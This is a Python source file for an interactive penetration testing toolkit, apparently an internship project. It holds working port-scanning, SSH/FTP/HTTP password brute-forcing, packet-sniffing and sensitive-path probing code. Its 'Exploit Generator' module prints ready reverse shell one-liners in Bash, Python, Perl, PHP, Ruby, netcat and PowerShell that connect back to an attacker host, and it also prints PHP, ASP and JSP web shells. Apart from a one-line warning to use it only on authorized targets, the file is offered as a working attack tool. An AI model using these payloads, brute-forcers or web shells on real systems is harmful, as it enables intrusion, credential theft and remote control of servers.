#!/usr/bin/env python3
"""
Penetration Testing Toolkit
A modular toolkit for security testing including port scanning, brute forcing, and more
Author: CODTECH Intern
"""

import socket
import sys
import threading
import time
import argparse
import subprocess
import os
import hashlib
import itertools
import string
from datetime import datetime
import requests
import base64
import json
import struct
from urllib.parse import urlparse


class Colors:
    """Terminal colors for output formatting."""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class PortScanner:
    """Module for port scanning functionality."""
    
    def __init__(self, target, start_port=1, end_port=1000, threads=100):
        self.target = target
        self.start_port = start_port
        self.end_port = end_port
        self.threads = threads
        self.open_ports = []
        self.lock = threading.Lock()
        
        # Common service ports
        self.common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            111: "RPCBind",
            135: "MSRPC",
            139: "NetBIOS-SSN",
            143: "IMAP",
            443: "HTTPS",
            445: "Microsoft-DS",
            993: "IMAPS",
            995: "POP3S",
            1723: "PPTP",
            3306: "MySQL",
            3389: "MS-WBT-Server",
            5432: "PostgreSQL",
            5900: "VNC",
            8080: "HTTP-Proxy",
            8443: "HTTPS-Alt",
            8888: "HTTP-Alt",
            27017: "MongoDB"
        }
    
    def scan_port(self, port):
        """Scan a single port."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            sock.close()
            
            if result == 0:
                with self.lock:
                    self.open_ports.append(port)
                    service = self.common_ports.get(port, "Unknown")
                    print(f"{Colors.GREEN}[+] Port {port}: OPEN ({service}){Colors.ENDC}")
                    
                    # Try to grab banner
                    try:
                        banner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        banner_sock.settimeout(2)
                        banner_sock.connect((self.target, port))
                        banner_sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                        banner = banner_sock.recv(1024).decode('utf-8', errors='ignore')
                        if banner:
                            print(f"    Banner: {banner.split(chr(13))[0]}")
                        banner_sock.close()
                    except:
                        pass
        except:
            pass
    
    def scan_range(self, port_range):
        """Scan a range of ports."""
        for port in port_range:
            self.scan_port(port)
    
    def run(self):
        """Run the port scanner."""
        print(f"\n{Colors.HEADER}[*] Starting Port Scanner{Colors.ENDC}")
        print(f"[*] Target: {self.target}")
        print(f"[*] Port range: {self.start_port}-{self.end_port}")
        print(f"[*] Threads: {self.threads}")
        print("-" * 50)
        
        # Resolve hostname to IP
        try:
            target_ip = socket.gethostbyname(self.target)
            print(f"[*] Resolved {self.target} to {target_ip}")
        except:
            print(f"{Colors.FAIL}[!] Cannot resolve hostname{Colors.ENDC}")
            return
        
        # Create threads
        ports = list(range(self.start_port, self.end_port + 1))
        chunk_size = len(ports) // self.threads
        threads = []
        
        start_time = time.time()
        
        for i in range(self.threads):
            start_idx = i * chunk_size
            if i == self.threads - 1:
                end_idx = len(ports)
            else:
                end_idx = (i + 1) * chunk_size
            
            thread = threading.Thread(target=self.scan_range, args=(ports[start_idx:end_idx],))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        
        print("-" * 50)
        print(f"\n[*] Scan completed in {end_time - start_time:.2f} seconds")
        print(f"[*] {len(self.open_ports)} open ports found")
        
        return self.open_ports


class BruteForcer:
    """Module for brute force attacks."""
    
    def __init__(self, target, username=None, wordlist=None):
        self.target = target
        self.username = username
        self.wordlist = wordlist
        self.found = False
        
    def generate_passwords(self, min_length=4, max_length=8, charset=None):
        """Generate passwords for brute force."""
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        for length in range(min_length, max_length + 1):
            for password in itertools.product(charset, repeat=length):
                yield ''.join(password)
    
    def ssh_brute_force(self, port=22, timeout=3):
        """Brute force SSH login."""
        print(f"\n{Colors.HEADER}[*] Starting SSH Brute Force{Colors.ENDC}")
        print(f"[*] Target: {self.target}:{port}")
        print(f"[*] Username: {self.username}")
        
        if not self.wordlist:
            print(f"{Colors.FAIL}[!] No wordlist provided{Colors.ENDC}")
            return
        
        try:
            import paramiko
        except ImportError:
            print(f"{Colors.FAIL}[!] Paramiko not installed. Install with: pip install paramiko{Colors.ENDC}")
            return
        
        try:
            with open(self.wordlist, 'r') as f:
                passwords = f.read().splitlines()
        except:
            print(f"{Colors.FAIL}[!] Cannot read wordlist{Colors.ENDC}")
            return
        
        for password in passwords:
            if self.found:
                break
                
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(self.target, port=port, username=self.username, 
                           password=password, timeout=timeout)
                
                print(f"{Colors.GREEN}[+] SUCCESS! Username: {self.username} Password: {password}{Colors.ENDC}")
                self.found = True
                ssh.close()
                return (self.username, password)
                
            except paramiko.AuthenticationException:
                print(f"[-] Failed: {password}")
            except Exception as e:
                print(f"{Colors.FAIL}[!] Connection error: {e}{Colors.ENDC}")
                break
        
        if not self.found:
            print(f"{Colors.WARNING}[!] Password not found in wordlist{Colors.ENDC}")
    
    def ftp_brute_force(self, port=21):
        """Brute force FTP login."""
        print(f"\n{Colors.HEADER}[*] Starting FTP Brute Force{Colors.ENDC}")
        print(f"[*] Target: {self.target}:{port}")
        print(f"[*] Username: {self.username}")
        
        if not self.wordlist:
            print(f"{Colors.FAIL}[!] No wordlist provided{Colors.ENDC}")
            return
        
        try:
            from ftplib import FTP
        except ImportError:
            print(f"{Colors.FAIL}[!] ftplib not available{Colors.ENDC}")
            return
        
        try:
            with open(self.wordlist, 'r') as f:
                passwords = f.read().splitlines()
        except:
            print(f"{Colors.FAIL}[!] Cannot read wordlist{Colors.ENDC}")
            return
        
        for password in passwords:
            if self.found:
                break
                
            try:
                ftp = FTP()
                ftp.connect(self.target, port, timeout=5)
                ftp.login(self.username, password)
                
                print(f"{Colors.GREEN}[+] SUCCESS! Username: {self.username} Password: {password}{Colors.ENDC}")
                self.found = True
                ftp.quit()
                return (self.username, password)
                
            except Exception as e:
                if "incorrect" in str(e).lower() or "failed" in str(e).lower():
                    print(f"[-] Failed: {password}")
                else:
                    print(f"{Colors.FAIL}[!] Connection error: {e}{Colors.ENDC}")
                    break
        
        if not self.found:
            print(f"{Colors.WARNING}[!] Password not found in wordlist{Colors.ENDC}")
    
    def http_brute_force(self, login_url, username_field='username', password_field='password'):
        """Brute force HTTP login."""
        print(f"\n{Colors.HEADER}[*] Starting HTTP Brute Force{Colors.ENDC}")
        print(f"[*] Target: {login_url}")
        print(f"[*] Username: {self.username}")
        
        if not self.wordlist:
            print(f"{Colors.FAIL}[!] No wordlist provided{Colors.ENDC}")
            return
        
        try:
            with open(self.wordlist, 'r') as f:
                passwords = f.read().splitlines()
        except:
            print(f"{Colors.FAIL}[!] Cannot read wordlist{Colors.ENDC}")
            return
        
        session = requests.Session()
        
        for password in passwords:
            if self.found:
                break
            
            data = {
                username_field: self.username,
                password_field: password
            }
            
            try:
                response = session.post(login_url, data=data, timeout=5)
                
                # Common indicators of failed login
                fail_indicators = ['failed', 'invalid', 'incorrect', 'error', 'denied']
                
                if not any(indicator in response.text.lower() for indicator in fail_indicators):
                    # Check for redirect (often indicates successful login)
                    if response.history or 'dashboard' in response.url or 'welcome' in response.text.lower():
                        print(f"{Colors.GREEN}[+] SUCCESS! Username: {self.username} Password: {password}{Colors.ENDC}")
                        self.found = True
                        return (self.username, password)
                
                print(f"[-] Failed: {password}")
                
            except Exception as e:
                print(f"{Colors.FAIL}[!] Request error: {e}{Colors.ENDC}")
                break
        
        if not self.found:
            print(f"{Colors.WARNING}[!] Password not found in wordlist{Colors.ENDC}")


class NetworkSniffer:
    """Module for network packet sniffing."""
    
    def __init__(self, interface=None):
        self.interface = interface
        
    def sniff_packets(self, count=10):
        """Sniff network packets (requires root/admin privileges)."""
        print(f"\n{Colors.HEADER}[*] Starting Network Sniffer{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] This module requires root/administrator privileges{Colors.ENDC}")
        
        try:
            import scapy.all as scapy
        except ImportError:
            print(f"{Colors.FAIL}[!] Scapy not installed. Install with: pip install scapy{Colors.ENDC}")
            return
        
        def packet_callback(packet):
            if packet.haslayer(scapy.IP):
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                proto = packet[scapy.IP].proto
                
                print(f"[*] {src_ip} -> {dst_ip} (Protocol: {proto})")
                
                if packet.haslayer(scapy.TCP):
                    src_port = packet[scapy.TCP].sport
                    dst_port = packet[scapy.TCP].dport
                    print(f"    TCP: {src_port} -> {dst_port}")
                    
                elif packet.haslayer(scapy.UDP):
                    src_port = packet[scapy.UDP].sport
                    dst_port = packet[scapy.UDP].dport
                    print(f"    UDP: {src_port} -> {dst_port}")
        
        try:
            print(f"[*] Sniffing {count} packets...")
            scapy.sniff(iface=self.interface, prn=packet_callback, count=count, store=0)
        except PermissionError:
            print(f"{Colors.FAIL}[!] Permission denied. Run as root/administrator{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")


class VulnerabilityScanner:
    """Module for basic vulnerability scanning."""
    
    def __init__(self, target):
        self.target = target
        
    def check_ssl_vulnerabilities(self):
        """Check for SSL/TLS vulnerabilities."""
        print(f"\n{Colors.HEADER}[*] Checking SSL/TLS Vulnerabilities{Colors.ENDC}")
        
        import ssl
        import socket
        
        ports = [443, 8443]
        
        for port in ports:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                with socket.create_connection((self.target, port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                        print(f"\n[*] Port {port}:")
                        print(f"    SSL Version: {ssock.version()}")
                        print(f"    Cipher: {ssock.cipher()}")
                        
                        cert = ssock.getpeercert()
                        if cert:
                            print(f"    Certificate Subject: {cert}")
                        
                        # Check for weak protocols
                        if ssock.version() in ['SSLv2', 'SSLv3', 'TLSv1.0']:
                            print(f"{Colors.WARNING}    [!] Weak SSL/TLS version detected!{Colors.ENDC}")
                        
            except Exception as e:
                if "timeout" not in str(e).lower():
                    print(f"[-] Port {port}: {e}")
    
    def check_common_vulns(self):
        """Check for common vulnerabilities."""
        print(f"\n{Colors.HEADER}[*] Checking Common Vulnerabilities{Colors.ENDC}")
        
        # Check for common files/directories
        common_paths = [
            '/.git/config',
            '/.env',
            '/wp-config.php',
            '/phpmyadmin/',
            '/admin/',
            '/administrator/',
            '/.htaccess',
            '/robots.txt',
            '/sitemap.xml',
            '/.DS_Store',
            '/config.php',
            '/backup/',
            '/temp/',
            '/test/',
            '/.svn/entries'
        ]
        
        for path in common_paths:
            try:
                url = f"http://{self.target}{path}"
                response = requests.get(url, timeout=3, allow_redirects=False)
                
                if response.status_code == 200:
                    print(f"{Colors.WARNING}[+] Found: {url} (Status: {response.status_code}){Colors.ENDC}")
                elif response.status_code in [301, 302]:
                    print(f"[*] Redirect: {url} -> {response.headers.get('Location', 'Unknown')}")
                    
            except:
                pass
    
    def run_nmap_scan(self):
        """Run Nmap scan for detailed vulnerability assessment."""
        print(f"\n{Colors.HEADER}[*] Running Nmap Vulnerability Scan{Colors.ENDC}")
        
        try:
            # Check if nmap is installed
            result = subprocess.run(['nmap', '--version'], capture_output=True, text=True)
            
            # Run vulnerability scan
            print("[*] This may take several minutes...")
            cmd = ['nmap', '-sV', '--script', 'vuln', self.target]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            print(result.stdout)
            
        except FileNotFoundError:
            print(f"{Colors.FAIL}[!] Nmap not installed. Install it from: https://nmap.org{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error running Nmap: {e}{Colors.ENDC}")


class ExploitModule:
    """Module for basic exploit demonstrations."""
    
    def __init__(self):
        pass
    
    def generate_reverse_shell(self, lhost, lport):
        """Generate reverse shell payloads."""
        print(f"\n{Colors.HEADER}[*] Reverse Shell Payloads{Colors.ENDC}")
        print(f"[*] LHOST: {lhost}")
        print(f"[*] LPORT: {lport}")
        print("-" * 50)
        
        payloads = {
            "Bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "Perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "PHP": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "Netcat": f"nc -e /bin/sh {lhost} {lport}",
            "Netcat (no -e)": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "PowerShell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        }
        
        for name, payload in payloads.items():
            print(f"\n{Colors.CYAN}{name}:{Colors.ENDC}")
            print(f"{payload}")
        
        print(f"\n{Colors.WARNING}[!] Start listener with: nc -lvnp {lport}{Colors.ENDC}")
    
    def generate_web_shells(self):
        """Generate simple web shells."""
        print(f"\n{Colors.HEADER}[*] Web Shell Examples{Colors.ENDC}")
        print("-" * 50)
        
        shells = {
            "PHP": '''<?php
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
?>''',
            "ASP": '''<%
    Dim oScript
    Dim oScriptNet
    Dim oFileSys, oFile
    Dim szCMD, szTempFile
    On Error Resume Next
    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
    Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
    szCMD = Request.Form(".CMD")
    If (szCMD <> "") Then
        szTempFile = "C:\\temp\\" & oFileSys.GetTempName()
        Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
        Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
    End If
%>''',
            "JSP": '''<%@ page import="java.util.*,java.io.*"%>
<%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
%>'''
        }
        
        for name, shell in shells.items():
            print(f"\n{Colors.CYAN}{name} Web Shell:{Colors.ENDC}")
            print(shell)
            print(f"\nUsage: http://target/shell.{name.lower()}?cmd=whoami")


class PentestToolkit:
    """Main penetration testing toolkit class."""
    
    def __init__(self):
        self.banner = f"""{Colors.CYAN}
╔═══════════════════════════════════════════╗
║       PENETRATION TESTING TOOLKIT         ║
║            CODTECH Internship             ║
╚═══════════════════════════════════════════╝{Colors.ENDC}
"""
    
    def print_menu(self):
        """Print main menu."""
        menu = f"""
{Colors.HEADER}Available Modules:{Colors.ENDC}
1. Port Scanner
2. Brute Force Attacks
3. Network Sniffer
4. Vulnerability Scanner
5. Exploit Generator
6. Generate Report
0. Exit

{Colors.WARNING}[!] Use responsibly and only on authorized targets{Colors.ENDC}
"""
        print(menu)
    
    def generate_report(self, results):
        """Generate penetration testing report."""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"pentest_report_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=4)
        
        print(f"\n{Colors.GREEN}[+] Report saved to: {filename}{Colors.ENDC}")
    
    def run(self):
        """Run the main toolkit interface."""
        print(self.banner)
        results = {}
        
        while True:
            self.print_menu()
            
            try:
                choice = input(f"{Colors.BOLD}Select module >> {Colors.ENDC}")
                
                if choice == '1':
                    # Port Scanner
                    target = input("Enter target host: ")
                    start_port = int(input("Start port (default 1): ") or "1")
                    end_port = int(input("End port (default 1000): ") or "1000")
                    threads = int(input("Number of threads (default 100): ") or "100")
                    
                    scanner = PortScanner(target, start_port, end_port, threads)
                    open_ports = scanner.run()
                    results['port_scan'] = {
                        'target': target,
                        'open_ports': open_ports,
                        'timestamp': datetime.now().isoformat()
                    }
                
                elif choice == '2':
                    # Brute Force
                    print("\nBrute Force Options:")
                    print("1. SSH")
                    print("2. FTP")
                    print("3. HTTP")
                    
                    bf_choice = input("Select service: ")
                    target = input("Enter target host: ")
                    username = input("Enter username: ")
                    wordlist = input("Enter wordlist path: ")
                    
                    bf = BruteForcer(target, username, wordlist)
                    
                    if bf_choice == '1':
                        result = bf.ssh_brute_force()
                    elif bf_choice == '2':
                        result = bf.ftp_brute_force()
                    elif bf_choice == '3':
                        login_url = input("Enter login URL: ")
                        result = bf.http_brute_force(login_url)
                    
                    if result:
                        results['brute_force'] = {
                            'service': ['SSH', 'FTP', 'HTTP'][int(bf_choice)-1],
                            'target': target,
                            'credentials': result,
                            'timestamp': datetime.now().isoformat()
                        }
                
                elif choice == '3':
                    # Network Sniffer
                    interface = input("Enter interface (leave blank for default): ") or None
                    count = int(input("Number of packets to capture (default 10): ") or "10")
                    
                    sniffer = NetworkSniffer(interface)
                    sniffer.sniff_packets(count)
                
                elif choice == '4':
                    # Vulnerability Scanner
                    target = input("Enter target host: ")
                    vuln_scanner = VulnerabilityScanner(target)
                    
                    vuln_scanner.check_ssl_vulnerabilities()
                    vuln_scanner.check_common_vulns()
                    
                    nmap_choice = input("\nRun Nmap vulnerability scan? (y/n): ")
                    if nmap_choice.lower() == 'y':
                        vuln_scanner.run_nmap_scan()
                
                elif choice == '5':
                    # Exploit Generator
                    print("\nExploit Options:")
                    print("1. Generate Reverse Shells")
                    print("2. Generate Web Shells")
                    
                    exp_choice = input("Select option: ")
                    exploit = ExploitModule()
                    
                    if exp_choice == '1':
                        lhost = input("Enter LHOST (your IP): ")
                        lport = input("Enter LPORT (your port): ")
                        exploit.generate_reverse_shell(lhost, lport)
                    elif exp_choice == '2':
                        exploit.generate_web_shells()
                
                elif choice == '6':
                    # Generate Report
                    if results:
                        self.generate_report(results)
                    else:
                        print(f"{Colors.WARNING}[!] No results to report{Colors.ENDC}")
                
                elif choice == '0':
                    print(f"\n{Colors.GREEN}[*] Exiting...{Colors.ENDC}")
                    break
                
                else:
                    print(f"{Colors.FAIL}[!] Invalid choice{Colors.ENDC}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Operation cancelled{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")


def main():
    parser = argparse.ArgumentParser(
        description="Penetration Testing Toolkit - A modular security testing framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python pentest_toolkit.py                    # Interactive mode
  python pentest_toolkit.py --quick-scan HOST  # Quick port scan
  python pentest_toolkit.py --help             # Show this help
        """
    )
    
    parser.add_argument('--quick-scan', metavar='HOST', help='Perform quick port scan on HOST')
    
    args = parser.parse_args()
    
    if args.quick_scan:
        # Quick scan mode
        scanner = PortScanner(args.quick_scan, 1, 1000, 100)
        scanner.run()
    else:
        # Interactive mode
        toolkit = PentestToolkit()
        try:
            toolkit.run()
        except KeyboardInterrupt:
            print(f"\n{Colors.GREEN}[*] Exiting...{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[!] Fatal error: {e}{Colors.ENDC}")


if __name__ == "__main__":
    main()
